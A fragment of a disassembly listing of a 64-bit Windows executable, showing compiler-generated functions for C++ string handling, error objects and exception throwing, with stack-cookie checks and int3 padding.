   1400015fe:	32 c0                	xor    %al,%al
   140001600:	48 83 c4 30          	add    $0x30,%rsp
   140001604:	5b                   	pop    %rbx
   140001605:	c3                   	ret
   140001606:	cc                   	int3
   140001607:	cc                   	int3
   140001608:	cc                   	int3
   140001609:	cc                   	int3
   14000160a:	cc                   	int3
   14000160b:	cc                   	int3
   14000160c:	cc                   	int3
   14000160d:	cc                   	int3
   14000160e:	cc                   	int3
   14000160f:	cc                   	int3
   140001610:	48 8b 42 08          	mov    0x8(%rdx),%rax
   140001614:	4c 8b 48 08          	mov    0x8(%rax),%r9
   140001618:	4c 39 49 08          	cmp    %r9,0x8(%rcx)
   14000161c:	75 08                	jne    0x140001626
   14000161e:	44 39 02             	cmp    %r8d,(%rdx)
   140001621:	75 03                	jne    0x140001626
   140001623:	b0 01                	mov    $0x1,%al
   140001625:	c3                   	ret
   140001626:	32 c0                	xor    %al,%al
   140001628:	c3                   	ret
   140001629:	cc                   	int3
   14000162a:	cc                   	int3
   14000162b:	cc                   	int3
   14000162c:	cc                   	int3
   14000162d:	cc                   	int3
   14000162e:	cc                   	int3
   14000162f:	cc                   	int3
   140001630:	48 8d 05 39 26 14 00 	lea    0x142639(%rip),%rax        # 0x140143c70
   140001637:	89 11                	mov    %edx,(%rcx)
   140001639:	48 89 41 08          	mov    %rax,0x8(%rcx)
   14000163d:	48 8b c1             	mov    %rcx,%rax
   140001640:	c3                   	ret
   140001641:	cc                   	int3
   140001642:	cc                   	int3
   140001643:	cc                   	int3
   140001644:	cc                   	int3
   140001645:	cc                   	int3
   140001646:	cc                   	int3
   140001647:	cc                   	int3
   140001648:	cc                   	int3
   140001649:	cc                   	int3
   14000164a:	cc                   	int3
   14000164b:	cc                   	int3
   14000164c:	cc                   	int3
   14000164d:	cc                   	int3
   14000164e:	cc                   	int3
   14000164f:	cc                   	int3
   140001650:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001655:	55                   	push   %rbp
   140001656:	56                   	push   %rsi
   140001657:	57                   	push   %rdi
   140001658:	48 83 ec 60          	sub    $0x60,%rsp
   14000165c:	48 8b 05 dd 19 14 00 	mov    0x1419dd(%rip),%rax        # 0x140143040
   140001663:	48 33 c4             	xor    %rsp,%rax
   140001666:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   14000166b:	49 8b d8             	mov    %r8,%rbx
   14000166e:	48 8b f2             	mov    %rdx,%rsi
   140001671:	48 8b f9             	mov    %rcx,%rdi
   140001674:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140001679:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   14000167e:	33 ed                	xor    %ebp,%ebp
   140001680:	49 39 68 10          	cmp    %rbp,0x10(%r8)
   140001684:	74 13                	je     0x140001699
   140001686:	44 8d 45 02          	lea    0x2(%rbp),%r8d
   14000168a:	48 8d 15 97 d0 12 00 	lea    0x12d097(%rip),%rdx        # 0x14012e728
   140001691:	48 8b cb             	mov    %rbx,%rcx
   140001694:	e8 97 82 00 00       	call   0x140009930
   140001699:	48 8b 4e 08          	mov    0x8(%rsi),%rcx
   14000169d:	48 8b 01             	mov    (%rcx),%rax
   1400016a0:	44 8b 06             	mov    (%rsi),%r8d
   1400016a3:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400016a8:	48 8b 40 10          	mov    0x10(%rax),%rax
   1400016ac:	ff 15 d6 bc 11 00    	call   *0x11bcd6(%rip)        # 0x14011d388
   1400016b2:	90                   	nop
   1400016b3:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400016b8:	48 83 7c 24 48 10    	cmpq   $0x10,0x48(%rsp)
   1400016be:	48 0f 43 54 24 30    	cmovae 0x30(%rsp),%rdx
   1400016c4:	4c 8b 44 24 40       	mov    0x40(%rsp),%r8
   1400016c9:	48 8b cb             	mov    %rbx,%rcx
   1400016cc:	e8 5f 82 00 00       	call   0x140009930
   1400016d1:	90                   	nop
   1400016d2:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   1400016d7:	48 83 fa 10          	cmp    $0x10,%rdx
   1400016db:	72 2e                	jb     0x14000170b
   1400016dd:	48 ff c2             	inc    %rdx
   1400016e0:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1400016e5:	48 8b c1             	mov    %rcx,%rax
   1400016e8:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400016ef:	72 15                	jb     0x140001706
   1400016f1:	48 83 c2 27          	add    $0x27,%rdx
   1400016f5:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1400016f9:	48 2b c1             	sub    %rcx,%rax
   1400016fc:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140001700:	48 83 f8 1f          	cmp    $0x1f,%rax
   140001704:	77 58                	ja     0x14000175e
   140001706:	e8 85 cc 0b 00       	call   0x1400be390
   14000170b:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000170e:	0f 11 07             	movups %xmm0,(%rdi)
   140001711:	48 89 6f 10          	mov    %rbp,0x10(%rdi)
   140001715:	48 89 6f 18          	mov    %rbp,0x18(%rdi)
   140001719:	0f 10 03             	movups (%rbx),%xmm0
   14000171c:	0f 11 07             	movups %xmm0,(%rdi)
   14000171f:	0f 10 4b 10          	movups 0x10(%rbx),%xmm1
   140001723:	0f 11 4f 10          	movups %xmm1,0x10(%rdi)
   140001727:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   14000172e:	00 
   14000172f:	48 89 6b 10          	mov    %rbp,0x10(%rbx)
   140001733:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   14000173a:	00 
   14000173b:	c6 03 00             	movb   $0x0,(%rbx)
   14000173e:	48 8b c7             	mov    %rdi,%rax
   140001741:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001746:	48 33 cc             	xor    %rsp,%rcx
   140001749:	e8 22 cc 0b 00       	call   0x1400be370
   14000174e:	48 8b 9c 24 98 00 00 	mov    0x98(%rsp),%rbx
   140001755:	00 
   140001756:	48 83 c4 60          	add    $0x60,%rsp
   14000175a:	5f                   	pop    %rdi
   14000175b:	5e                   	pop    %rsi
   14000175c:	5d                   	pop    %rbp
   14000175d:	c3                   	ret
   14000175e:	e8 5d 1f 0e 00       	call   0x1400e36c0
   140001763:	90                   	nop
   140001764:	cc                   	int3
   140001765:	cc                   	int3
   140001766:	cc                   	int3
   140001767:	cc                   	int3
   140001768:	cc                   	int3
   140001769:	cc                   	int3
   14000176a:	cc                   	int3
   14000176b:	cc                   	int3
   14000176c:	cc                   	int3
   14000176d:	cc                   	int3
   14000176e:	cc                   	int3
   14000176f:	cc                   	int3
   140001770:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001775:	55                   	push   %rbp
   140001776:	56                   	push   %rsi
   140001777:	57                   	push   %rdi
   140001778:	48 8d 6c 24 b9       	lea    -0x47(%rsp),%rbp
   14000177d:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   140001784:	48 8b 05 b5 18 14 00 	mov    0x1418b5(%rip),%rax        # 0x140143040
   14000178b:	48 33 c4             	xor    %rsp,%rax
   14000178e:	48 89 45 37          	mov    %rax,0x37(%rbp)
   140001792:	48 8b f2             	mov    %rdx,%rsi
   140001795:	48 8b d9             	mov    %rcx,%rbx
   140001798:	48 89 4d c7          	mov    %rcx,-0x39(%rbp)
   14000179c:	49 8b d0             	mov    %r8,%rdx
   14000179f:	48 8d 4d cf          	lea    -0x31(%rbp),%rcx
   1400017a3:	e8 28 72 00 00       	call   0x1400089d0
   1400017a8:	48 8b f8             	mov    %rax,%rdi
   1400017ab:	48 89 45 c7          	mov    %rax,-0x39(%rbp)
   1400017af:	0f 10 06             	movups (%rsi),%xmm0
   1400017b2:	0f 29 45 f7          	movaps %xmm0,-0x9(%rbp)
   1400017b6:	48 83 78 10 00       	cmpq   $0x0,0x10(%rax)
   1400017bb:	74 15                	je     0x1400017d2
   1400017bd:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400017c3:	48 8d 15 5e cf 12 00 	lea    0x12cf5e(%rip),%rdx        # 0x14012e728
   1400017ca:	48 8b c8             	mov    %rax,%rcx
   1400017cd:	e8 5e 81 00 00       	call   0x140009930
   1400017d2:	48 8b 4d ff          	mov    -0x1(%rbp),%rcx
   1400017d6:	48 8b 01             	mov    (%rcx),%rax
   1400017d9:	44 8b 45 f7          	mov    -0x9(%rbp),%r8d
   1400017dd:	48 8d 55 f7          	lea    -0x9(%rbp),%rdx
   1400017e1:	48 8b 40 10          	mov    0x10(%rax),%rax
   1400017e5:	ff 15 9d bb 11 00    	call   *0x11bb9d(%rip)        # 0x14011d388
   1400017eb:	90                   	nop
   1400017ec:	48 8d 55 f7          	lea    -0x9(%rbp),%rdx
   1400017f0:	48 83 7d 0f 10       	cmpq   $0x10,0xf(%rbp)
   1400017f5:	48 0f 43 55 f7       	cmovae -0x9(%rbp),%rdx
   1400017fa:	4c 8b 45 07          	mov    0x7(%rbp),%r8
   1400017fe:	48 8b cf             	mov    %rdi,%rcx
   140001801:	e8 2a 81 00 00       	call   0x140009930
   140001806:	90                   	nop
   140001807:	48 8b 55 0f          	mov    0xf(%rbp),%rdx
   14000180b:	48 83 fa 10          	cmp    $0x10,%rdx
   14000180f:	72 31                	jb     0x140001842
   140001811:	48 ff c2             	inc    %rdx
   140001814:	48 8b 4d f7          	mov    -0x9(%rbp),%rcx
   140001818:	48 8b c1             	mov    %rcx,%rax
   14000181b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140001822:	72 19                	jb     0x14000183d
   140001824:	48 83 c2 27          	add    $0x27,%rdx
   140001828:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   14000182c:	48 2b c1             	sub    %rcx,%rax
   14000182f:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140001833:	48 83 f8 1f          	cmp    $0x1f,%rax
   140001837:	0f 87 e3 00 00 00    	ja     0x140001920
   14000183d:	e8 4e cb 0b 00       	call   0x1400be390
   140001842:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001845:	0f 11 45 17          	movups %xmm0,0x17(%rbp)
   140001849:	0f 57 c9             	xorps  %xmm1,%xmm1
   14000184c:	f3 0f 7f 4d 27       	movdqu %xmm1,0x27(%rbp)
   140001851:	0f 10 07             	movups (%rdi),%xmm0
   140001854:	0f 11 45 17          	movups %xmm0,0x17(%rbp)
   140001858:	0f 10 4f 10          	movups 0x10(%rdi),%xmm1
   14000185c:	0f 11 4d 27          	movups %xmm1,0x27(%rbp)
   140001860:	48 c7 47 10 00 00 00 	movq   $0x0,0x10(%rdi)
   140001867:	00 
   140001868:	48 c7 47 18 0f 00 00 	movq   $0xf,0x18(%rdi)
   14000186f:	00 
   140001870:	c6 07 00             	movb   $0x0,(%rdi)
   140001873:	48 8d 45 17          	lea    0x17(%rbp),%rax
   140001877:	48 83 7d 2f 10       	cmpq   $0x10,0x2f(%rbp)
   14000187c:	48 0f 43 45 17       	cmovae 0x17(%rbp),%rax
   140001881:	48 8d 0d 60 c4 11 00 	lea    0x11c460(%rip),%rcx        # 0x14011dce8
   140001888:	48 89 0b             	mov    %rcx,(%rbx)
   14000188b:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000188f:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001892:	0f 11 02             	movups %xmm0,(%rdx)
   140001895:	48 89 45 f7          	mov    %rax,-0x9(%rbp)
   140001899:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
   14000189d:	48 8d 4d f7          	lea    -0x9(%rbp),%rcx
   1400018a1:	e8 e2 f2 0b 00       	call   0x1400c0b88
   1400018a6:	48 8d 05 0b c5 11 00 	lea    0x11c50b(%rip),%rax        # 0x14011ddb8
   1400018ad:	48 89 03             	mov    %rax,(%rbx)
   1400018b0:	48 8b 55 2f          	mov    0x2f(%rbp),%rdx
   1400018b4:	48 83 fa 10          	cmp    $0x10,%rdx
   1400018b8:	72 2d                	jb     0x1400018e7
   1400018ba:	48 ff c2             	inc    %rdx
   1400018bd:	48 8b 4d 17          	mov    0x17(%rbp),%rcx
   1400018c1:	48 8b c1             	mov    %rcx,%rax
   1400018c4:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400018cb:	72 15                	jb     0x1400018e2
   1400018cd:	48 83 c2 27          	add    $0x27,%rdx
   1400018d1:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1400018d5:	48 2b c1             	sub    %rcx,%rax
   1400018d8:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   1400018dc:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400018e0:	77 38                	ja     0x14000191a
   1400018e2:	e8 a9 ca 0b 00       	call   0x1400be390
   1400018e7:	48 8d 05 d2 d9 11 00 	lea    0x11d9d2(%rip),%rax        # 0x14011f2c0
   1400018ee:	48 89 03             	mov    %rax,(%rbx)
   1400018f1:	0f 10 06             	movups (%rsi),%xmm0
   1400018f4:	0f 11 43 18          	movups %xmm0,0x18(%rbx)
   1400018f8:	48 8b c3             	mov    %rbx,%rax
   1400018fb:	48 8b 4d 37          	mov    0x37(%rbp),%rcx
   1400018ff:	48 33 cc             	xor    %rsp,%rcx
   140001902:	e8 69 ca 0b 00       	call   0x1400be370
   140001907:	48 8b 9c 24 d8 00 00 	mov    0xd8(%rsp),%rbx
   14000190e:	00 
   14000190f:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
   140001916:	5f                   	pop    %rdi
   140001917:	5e                   	pop    %rsi
   140001918:	5d                   	pop    %rbp
   140001919:	c3                   	ret
   14000191a:	e8 a1 1d 0e 00       	call   0x1400e36c0
   14000191f:	90                   	nop
   140001920:	e8 9b 1d 0e 00       	call   0x1400e36c0
   140001925:	90                   	nop
   140001926:	cc                   	int3
   140001927:	cc                   	int3
   140001928:	cc                   	int3
   140001929:	cc                   	int3
   14000192a:	cc                   	int3
   14000192b:	cc                   	int3
   14000192c:	cc                   	int3
   14000192d:	cc                   	int3
   14000192e:	cc                   	int3
   14000192f:	cc                   	int3
   140001930:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001935:	57                   	push   %rdi
   140001936:	48 83 ec 20          	sub    $0x20,%rsp
   14000193a:	48 8d 05 a7 c3 11 00 	lea    0x11c3a7(%rip),%rax        # 0x14011dce8
   140001941:	48 8b f9             	mov    %rcx,%rdi
   140001944:	48 89 01             	mov    %rax,(%rcx)
   140001947:	8b da                	mov    %edx,%ebx
   140001949:	48 83 c1 08          	add    $0x8,%rcx
   14000194d:	e8 c6 f2 0b 00       	call   0x1400c0c18
   140001952:	f6 c3 01             	test   $0x1,%bl
   140001955:	74 0d                	je     0x140001964
   140001957:	ba 28 00 00 00       	mov    $0x28,%edx
   14000195c:	48 8b cf             	mov    %rdi,%rcx
   14000195f:	e8 2c ca 0b 00       	call   0x1400be390
   140001964:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001969:	48 8b c7             	mov    %rdi,%rax
   14000196c:	48 83 c4 20          	add    $0x20,%rsp
   140001970:	5f                   	pop    %rdi
   140001971:	c3                   	ret
   140001972:	cc                   	int3
   140001973:	cc                   	int3
   140001974:	cc                   	int3
   140001975:	cc                   	int3
   140001976:	cc                   	int3
   140001977:	cc                   	int3
   140001978:	cc                   	int3
   140001979:	cc                   	int3
   14000197a:	cc                   	int3
   14000197b:	cc                   	int3
   14000197c:	cc                   	int3
   14000197d:	cc                   	int3
   14000197e:	cc                   	int3
   14000197f:	cc                   	int3
   140001980:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001985:	57                   	push   %rdi
   140001986:	48 83 ec 60          	sub    $0x60,%rsp
   14000198a:	48 8b 05 af 16 14 00 	mov    0x1416af(%rip),%rax        # 0x140143040
   140001991:	48 33 c4             	xor    %rsp,%rax
   140001994:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001999:	49 8b c0             	mov    %r8,%rax
   14000199c:	48 8b fa             	mov    %rdx,%rdi
   14000199f:	48 8b d9             	mov    %rcx,%rbx
   1400019a2:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400019a7:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400019aa:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   1400019af:	0f 57 c9             	xorps  %xmm1,%xmm1
   1400019b2:	f3 0f 7f 4c 24 40    	movdqu %xmm1,0x40(%rsp)
   1400019b8:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   1400019bf:	90                   	nop
   1400019c0:	49 ff c0             	inc    %r8
   1400019c3:	42 80 3c 00 00       	cmpb   $0x0,(%rax,%r8,1)
   1400019c8:	75 f6                	jne    0x1400019c0
   1400019ca:	48 8b d0             	mov    %rax,%rdx
   1400019cd:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400019d2:	e8 69 c2 00 00       	call   0x14000dc40
   1400019d7:	90                   	nop
   1400019d8:	0f 10 07             	movups (%rdi),%xmm0
   1400019db:	0f 29 44 24 20       	movaps %xmm0,0x20(%rsp)
   1400019e0:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   1400019e5:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400019ea:	48 8b cb             	mov    %rbx,%rcx
   1400019ed:	e8 7e fd ff ff       	call   0x140001770
   1400019f2:	90                   	nop
   1400019f3:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   1400019f8:	48 83 fa 10          	cmp    $0x10,%rdx
   1400019fc:	72 2e                	jb     0x140001a2c
   1400019fe:	48 ff c2             	inc    %rdx
   140001a01:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140001a06:	48 8b c1             	mov    %rcx,%rax
   140001a09:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140001a10:	72 15                	jb     0x140001a27
   140001a12:	48 83 c2 27          	add    $0x27,%rdx
   140001a16:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140001a1a:	48 2b c1             	sub    %rcx,%rax
   140001a1d:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140001a21:	48 83 f8 1f          	cmp    $0x1f,%rax
   140001a25:	77 2d                	ja     0x140001a54
   140001a27:	e8 64 c9 0b 00       	call   0x1400be390
   140001a2c:	48 8d 05 a5 d8 11 00 	lea    0x11d8a5(%rip),%rax        # 0x14011f2d8
   140001a33:	48 89 03             	mov    %rax,(%rbx)
   140001a36:	48 8b c3             	mov    %rbx,%rax
   140001a39:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001a3e:	48 33 cc             	xor    %rsp,%rcx
   140001a41:	e8 2a c9 0b 00       	call   0x1400be370
   140001a46:	48 8b 9c 24 88 00 00 	mov    0x88(%rsp),%rbx
   140001a4d:	00 
   140001a4e:	48 83 c4 60          	add    $0x60,%rsp
   140001a52:	5f                   	pop    %rdi
   140001a53:	c3                   	ret
   140001a54:	e8 67 1c 0e 00       	call   0x1400e36c0
   140001a59:	cc                   	int3
   140001a5a:	cc                   	int3
   140001a5b:	cc                   	int3
   140001a5c:	cc                   	int3
   140001a5d:	cc                   	int3
   140001a5e:	cc                   	int3
   140001a5f:	cc                   	int3
   140001a60:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001a65:	57                   	push   %rdi
   140001a66:	48 83 ec 20          	sub    $0x20,%rsp
   140001a6a:	48 8b da             	mov    %rdx,%rbx
   140001a6d:	48 8d 05 74 c2 11 00 	lea    0x11c274(%rip),%rax        # 0x14011dce8
   140001a74:	48 89 01             	mov    %rax,(%rcx)
   140001a77:	48 8d 51 08          	lea    0x8(%rcx),%rdx
   140001a7b:	48 8b f9             	mov    %rcx,%rdi
   140001a7e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001a81:	0f 11 02             	movups %xmm0,(%rdx)
   140001a84:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   140001a88:	e8 fb f0 0b 00       	call   0x1400c0b88
   140001a8d:	48 8d 05 2c d8 11 00 	lea    0x11d82c(%rip),%rax        # 0x14011f2c0
   140001a94:	48 89 07             	mov    %rax,(%rdi)
   140001a97:	48 8d 05 3a d8 11 00 	lea    0x11d83a(%rip),%rax        # 0x14011f2d8
   140001a9e:	0f 10 43 18          	movups 0x18(%rbx),%xmm0
   140001aa2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001aa7:	48 89 07             	mov    %rax,(%rdi)
   140001aaa:	48 8b c7             	mov    %rdi,%rax
   140001aad:	0f 11 47 18          	movups %xmm0,0x18(%rdi)
   140001ab1:	48 83 c4 20          	add    $0x20,%rsp
   140001ab5:	5f                   	pop    %rdi
   140001ab6:	c3                   	ret
   140001ab7:	cc                   	int3
   140001ab8:	cc                   	int3
   140001ab9:	cc                   	int3
   140001aba:	cc                   	int3
   140001abb:	cc                   	int3
   140001abc:	cc                   	int3
   140001abd:	cc                   	int3
   140001abe:	cc                   	int3
   140001abf:	cc                   	int3
   140001ac0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001ac5:	57                   	push   %rdi
   140001ac6:	48 83 ec 20          	sub    $0x20,%rsp
   140001aca:	48 8b da             	mov    %rdx,%rbx
   140001acd:	48 8d 05 14 c2 11 00 	lea    0x11c214(%rip),%rax        # 0x14011dce8
   140001ad4:	48 89 01             	mov    %rax,(%rcx)
   140001ad7:	48 8d 51 08          	lea    0x8(%rcx),%rdx
   140001adb:	48 8b f9             	mov    %rcx,%rdi
   140001ade:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001ae1:	0f 11 02             	movups %xmm0,(%rdx)
   140001ae4:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   140001ae8:	e8 9b f0 0b 00       	call   0x1400c0b88
   140001aed:	48 8d 05 cc d7 11 00 	lea    0x11d7cc(%rip),%rax        # 0x14011f2c0
   140001af4:	48 89 07             	mov    %rax,(%rdi)
   140001af7:	48 8b c7             	mov    %rdi,%rax
   140001afa:	0f 10 43 18          	movups 0x18(%rbx),%xmm0
   140001afe:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001b03:	0f 11 47 18          	movups %xmm0,0x18(%rdi)
   140001b07:	48 83 c4 20          	add    $0x20,%rsp
   140001b0b:	5f                   	pop    %rdi
   140001b0c:	c3                   	ret
   140001b0d:	cc                   	int3
   140001b0e:	cc                   	int3
   140001b0f:	cc                   	int3
   140001b10:	48 8d 05 19 cc 12 00 	lea    0x12cc19(%rip),%rax        # 0x14012e730
   140001b17:	c3                   	ret
   140001b18:	cc                   	int3
   140001b19:	cc                   	int3
   140001b1a:	cc                   	int3
   140001b1b:	cc                   	int3
   140001b1c:	cc                   	int3
   140001b1d:	cc                   	int3
   140001b1e:	cc                   	int3
   140001b1f:	cc                   	int3
   140001b20:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001b25:	57                   	push   %rdi
   140001b26:	48 83 ec 30          	sub    $0x30,%rsp
   140001b2a:	33 ff                	xor    %edi,%edi
   140001b2c:	48 8b da             	mov    %rdx,%rbx
   140001b2f:	41 83 f8 01          	cmp    $0x1,%r8d
   140001b33:	75 5c                	jne    0x140001b91
   140001b35:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001b38:	8d 4f 20             	lea    0x20(%rdi),%ecx
   140001b3b:	0f 11 02             	movups %xmm0,(%rdx)
   140001b3e:	48 89 7a 10          	mov    %rdi,0x10(%rdx)
   140001b42:	48 c7 42 18 0f 00 00 	movq   $0xf,0x18(%rdx)
   140001b49:	00 
   140001b4a:	e8 c1 c4 00 00       	call   0x14000e010
   140001b4f:	48 89 03             	mov    %rax,(%rbx)
   140001b52:	48 c7 43 10 15 00 00 	movq   $0x15,0x10(%rbx)
   140001b59:	00 
   140001b5a:	48 c7 43 18 1f 00 00 	movq   $0x1f,0x18(%rbx)
   140001b61:	00 
   140001b62:	0f 10 05 47 fa 12 00 	movups 0x12fa47(%rip),%xmm0        # 0x1401315b0
   140001b69:	0f 11 00             	movups %xmm0,(%rax)
   140001b6c:	8b 0d 4e fa 12 00    	mov    0x12fa4e(%rip),%ecx        # 0x1401315c0
   140001b72:	89 48 10             	mov    %ecx,0x10(%rax)
   140001b75:	0f b6 0d 48 fa 12 00 	movzbl 0x12fa48(%rip),%ecx        # 0x1401315c4
   140001b7c:	88 48 14             	mov    %cl,0x14(%rax)
   140001b7f:	40 88 78 15          	mov    %dil,0x15(%rax)
   140001b83:	48 8b c3             	mov    %rbx,%rax
   140001b86:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140001b8b:	48 83 c4 30          	add    $0x30,%rsp
   140001b8f:	5f                   	pop    %rdi
   140001b90:	c3                   	ret
   140001b91:	41 8b c8             	mov    %r8d,%ecx
   140001b94:	e8 8f cd 08 00       	call   0x14008e928
   140001b99:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001b9c:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   140001ba3:	0f 11 03             	movups %xmm0,(%rbx)
   140001ba6:	48 89 7b 10          	mov    %rdi,0x10(%rbx)
   140001baa:	48 89 7b 18          	mov    %rdi,0x18(%rbx)
   140001bae:	66 90                	xchg   %ax,%ax
   140001bb0:	49 ff c0             	inc    %r8
   140001bb3:	42 38 3c 00          	cmp    %dil,(%rax,%r8,1)
   140001bb7:	75 f7                	jne    0x140001bb0
   140001bb9:	48 8b d0             	mov    %rax,%rdx
   140001bbc:	48 8b cb             	mov    %rbx,%rcx
   140001bbf:	e8 7c c0 00 00       	call   0x14000dc40
   140001bc4:	48 8b c3             	mov    %rbx,%rax
   140001bc7:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140001bcc:	48 83 c4 30          	add    $0x30,%rsp
   140001bd0:	5f                   	pop    %rdi
   140001bd1:	c3                   	ret
   140001bd2:	cc                   	int3
   140001bd3:	cc                   	int3
   140001bd4:	cc                   	int3
   140001bd5:	cc                   	int3
   140001bd6:	cc                   	int3
   140001bd7:	cc                   	int3
   140001bd8:	cc                   	int3
   140001bd9:	cc                   	int3
   140001bda:	cc                   	int3
   140001bdb:	cc                   	int3
   140001bdc:	cc                   	int3
   140001bdd:	cc                   	int3
   140001bde:	cc                   	int3
   140001bdf:	cc                   	int3
   140001be0:	40 53                	rex push %rbx
   140001be2:	48 83 ec 20          	sub    $0x20,%rsp
   140001be6:	48 8b d9             	mov    %rcx,%rbx
   140001be9:	f6 c2 01             	test   $0x1,%dl
   140001bec:	74 0a                	je     0x140001bf8
   140001bee:	ba 10 00 00 00       	mov    $0x10,%edx
   140001bf3:	e8 98 c7 0b 00       	call   0x1400be390
   140001bf8:	48 8b c3             	mov    %rbx,%rax
   140001bfb:	48 83 c4 20          	add    $0x20,%rsp
   140001bff:	5b                   	pop    %rbx
   140001c00:	c3                   	ret
   140001c01:	cc                   	int3
   140001c02:	cc                   	int3
   140001c03:	cc                   	int3
   140001c04:	cc                   	int3
   140001c05:	cc                   	int3
   140001c06:	cc                   	int3
   140001c07:	cc                   	int3
   140001c08:	cc                   	int3
   140001c09:	cc                   	int3
   140001c0a:	cc                   	int3
   140001c0b:	cc                   	int3
   140001c0c:	cc                   	int3
   140001c0d:	cc                   	int3
   140001c0e:	cc                   	int3
   140001c0f:	cc                   	int3
   140001c10:	48 8d 05 59 20 14 00 	lea    0x142059(%rip),%rax        # 0x140143c70
   140001c17:	c3                   	ret
   140001c18:	cc                   	int3
   140001c19:	cc                   	int3
   140001c1a:	cc                   	int3
   140001c1b:	cc                   	int3
   140001c1c:	cc                   	int3
   140001c1d:	cc                   	int3
   140001c1e:	cc                   	int3
   140001c1f:	cc                   	int3
   140001c20:	48 8d 05 19 cb 12 00 	lea    0x12cb19(%rip),%rax        # 0x14012e740
   140001c27:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   140001c2e:	00 
   140001c2f:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140001c33:	48 8d 05 26 d7 11 00 	lea    0x11d726(%rip),%rax        # 0x14011f360
   140001c3a:	48 89 01             	mov    %rax,(%rcx)
   140001c3d:	48 8b c1             	mov    %rcx,%rax
   140001c40:	c3                   	ret
   140001c41:	cc                   	int3
   140001c42:	cc                   	int3
   140001c43:	cc                   	int3
   140001c44:	cc                   	int3
   140001c45:	cc                   	int3
   140001c46:	cc                   	int3
   140001c47:	cc                   	int3
   140001c48:	cc                   	int3
   140001c49:	cc                   	int3
   140001c4a:	cc                   	int3
   140001c4b:	cc                   	int3
   140001c4c:	cc                   	int3
   140001c4d:	cc                   	int3
   140001c4e:	cc                   	int3
   140001c4f:	cc                   	int3
   140001c50:	48 83 ec 48          	sub    $0x48,%rsp
   140001c54:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001c59:	e8 c2 ff ff ff       	call   0x140001c20
   140001c5e:	48 8d 15 cb 04 14 00 	lea    0x1404cb(%rip),%rdx        # 0x140142130
   140001c65:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001c6a:	e8 05 f3 0b 00       	call   0x1400c0f74
   140001c6f:	cc                   	int3
   140001c70:	40 53                	rex push %rbx
   140001c72:	48 83 ec 20          	sub    $0x20,%rsp
   140001c76:	48 8b d9             	mov    %rcx,%rbx
   140001c79:	48 8b c2             	mov    %rdx,%rax
   140001c7c:	48 8d 0d 65 c0 11 00 	lea    0x11c065(%rip),%rcx        # 0x14011dce8
   140001c83:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001c86:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   140001c8a:	48 89 0b             	mov    %rcx,(%rbx)
   140001c8d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001c91:	0f 11 02             	movups %xmm0,(%rdx)
